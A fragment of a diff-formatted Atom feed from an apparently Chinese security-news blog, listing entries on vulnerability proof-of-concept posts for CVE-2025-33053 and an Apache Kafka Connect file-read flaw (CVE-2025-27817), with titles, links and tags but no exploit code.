-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-33053 Exploit via Malicious .U</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Apache Kafka Connect 任意文件读取漏洞(CVE-2025-27817)</title>
-    <link href="http://example.com/2025/06/18/weixin_3876147442/"/>
-    <id>http://example.com/2025/06/18/weixin_3876147442/</id>
-    <published>2025-06-18T03:05:29.964Z</published>
-    <updated>2025-06-18T03:05:29.964Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> Nday Poc</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/qT6QnKs0zejjlqVFmxJtpw">https://mp.weixin.qq.com/s/qT6QnKs0zejjlqVFmxJtpw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Nday Poc&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/qT6QnKs0zejjlqVFmxJtpw&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="Nday Poc" scheme="http://example.com/tags/Nday-Poc/"/>
     
   </entry>
   
